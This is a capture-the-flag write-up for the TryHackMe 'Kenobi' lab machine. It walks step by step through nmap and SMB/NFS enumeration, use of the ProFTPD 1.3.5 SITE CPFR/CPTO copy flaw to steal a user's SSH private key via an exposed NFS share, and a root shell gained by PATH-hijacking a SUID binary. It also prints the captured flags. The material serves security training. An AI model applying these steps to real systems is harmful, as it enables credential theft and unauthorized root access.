# Kenobi
#### Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.
#### [Room Link](1)

## Task 1
1. Deploy the Vulnerable Machine
  Deploy the machine and ping the IP with `ping [machineIP]` to confirm it is online.
  2. Scan the machine with nmap, how many ports are open?
    Run nmap scan with `nmap -sV -sC -Pn -oN nmap_basic.txt [machineIP]` after running for a bit
    we get the results.
    ```
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-20 10:32 EDT
Nmap scan report for 10.10.191.44
Host is up (0.13s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      42525/tcp6  mountd
|   100005  1,2,3      45675/tcp   mountd
|   100005  1,2,3      46317/udp6  mountd
|   100005  1,2,3      56801/udp   mountd
|   100021  1,3,4      37021/udp   nlockmgr
|   100021  1,3,4      40439/tcp6  nlockmgr
|   100021  1,3,4      43293/tcp   nlockmgr
|   100021  1,3,4      54258/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2020-03-20T09:33:26-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-03-20T14:33:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.02 seconds
    ```
    With that we get 7 ports open.

## 2. Task 2
  Enumerating Samba for shares
  1. Using nmap we can enumerate a machine for SMB shares.
      We run the nmap scan given `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse -oN nmap_smb.txt [machineIP]`
      with that we get:
      ```
      Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-20 10:58 EDT
Nmap scan report for 10.10.191.44
Host is up (0.13s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.191.44\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.191.44\anonymous:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.191.44\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 19.33 seconds
      ```
      WE see that we enumed 3 shares. with that we can access the anonymous share with read/write and requires no password to access.
      2. list the files on the share. What is the file can you see?
      Lets get started with `smbclient //[machineIP]/anonymous`
      we see
      ```
      smbclient //10.10.191.44/anonymous/
Enter WORKGROUP\naphal's password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

		9204224 blocks of size 1024. 6877104 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (23.1 KiloBytes/sec) (average 23.1 KiloBytes/sec)
      ```
      after `cat log.txt` we see alot of installation file log information which I set information [here](2).

      After downloading it within the smbclient with `get log.txt` we can read some of the installation notes and see that FTP is set up on port 21.
      To further scan the rpcbind port which converts programs to universal addresses making them accessible from outside the computer.
      Scanning nfs scripts within nmap within `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount -oN nmap_nfs.txt [machineIP]`

      After working for a bit, nmap produces
      ```
      Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-20 11:16 EDT
Nmap scan report for 10.10.191.44
Host is up (0.13s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount:
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 1.36 seconds
      ```


## 3. Task 3
  We connect to the ftp server with nc via `nc 10.10.191.44 21`. We get the response
  `220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.191.44]`
  We can check if that version is vulnerable using the command line tool `searchsploit`.

  Using the cmd `searchsploit ProFTPd 1.3.5` we get the response.
  ```
  ---------------- ----------------------------------------
 Exploit Title  |  Path
                | (/usr/share/exploitdb/)
---------------- ----------------------------------------
ProFTPd 1.3.5 - | exploits/linux/remote/36742.txt
ProFTPd 1.3.5 - | exploits/linux/remote/36803.py
ProFTPd 1.3.5 - | exploits/linux/remote/37262.rb
---------------- ----------------------------------------
  ```
From there we can see that this version of ProFTPD lets up copy files and move to certain directories as anonymous. With that we can move the ssh key into the /var/tmp directory which can be accessed via the open NFS share on port 111
```
nc 10.10.191.44 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.191.44]

500 Invalid command: try being more creative
CPFR
500 CPFR not understood
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTP /var/tmp/id_rsa
500 'SITE CPTP' not understood
SITE CPTO /var/tmp/id_rsa
250 Copy successful
421 Login timeout (300 seconds): closing control connection
```
We can mount the var share via `sudo mkdir /mnt/kenobiNFS` then `sudo mount [machineIP]:var /mnt/kenobiNFS` then when we `ls -la /mnt/kenobiNFS` we can see the `/var` directory which has the copied `id_rsa` which we can try to use and ssh into the port we scanned into earlier with nmap.

We correct the permissions for the id_rsa file with `sudo chmod 600 id_rsa` and then ssh in with `ssh -i id_rsa kenobi@[machineIP]`. With that we can get the user flag and gain persistance from there.
```
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls -la
total 40
drwxr-xr-x 5 kenobi kenobi 4096 Sep  4  2019 .
drwxr-xr-x 3 root   root   4096 Sep  4  2019 ..
lrwxrwxrwx 1 root   root      9 Sep  4  2019 .bash_history -> /dev/null
-rw-r--r-- 1 kenobi kenobi  220 Sep  4  2019 .bash_logout
-rw-r--r-- 1 kenobi kenobi 3771 Sep  4  2019 .bashrc
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .cache
-rw-r--r-- 1 kenobi kenobi  655 Sep  4  2019 .profile
drwxr-xr-x 2 kenobi kenobi 4096 Sep  4  2019 share
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .ssh
-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
-rw------- 1 kenobi kenobi  642 Sep  4  2019 .viminfo
kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
```
## 4. Task 4
  Search the machine for SUID binaries and pipe all the errors to /dev/null
  `find / -perm -u=s -type f 2>/dev/null`

  We see that `/usr/bin/menu` lets us run it and see whats available.
  ```
  kenobi@kenobi:~$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice ""
  ```
  We select 1 and see that it sends a status check and get a `HTTP/1.1 200 OK`. Looking up
  the menu application we see that it send out the status check. One workaround we can try is to hijack the path with our own version of curl and running the SUID /usr/bin/menu to see what we can access.

  Using the menu program we can open /bin/sh as root and gain full access to the machines

  ```
  kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmos 777 curl
-bash: chmos: command not found
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# ls
curl
systemd-private-6353f8cb9a6343b38c8f4706ec81e921-systemd-timesyncd.service-qe1YQY
# pwd
/tmp
# cd /root
# ls
root.txt
# cat root.txt
177b3cd8562289f37382721c28381f02
  ```

## Review

For links
[1]:https://tryhackme.com/room/kenobi
[2]: ./resources/log.txt
[3]:
[4]:
[5]:
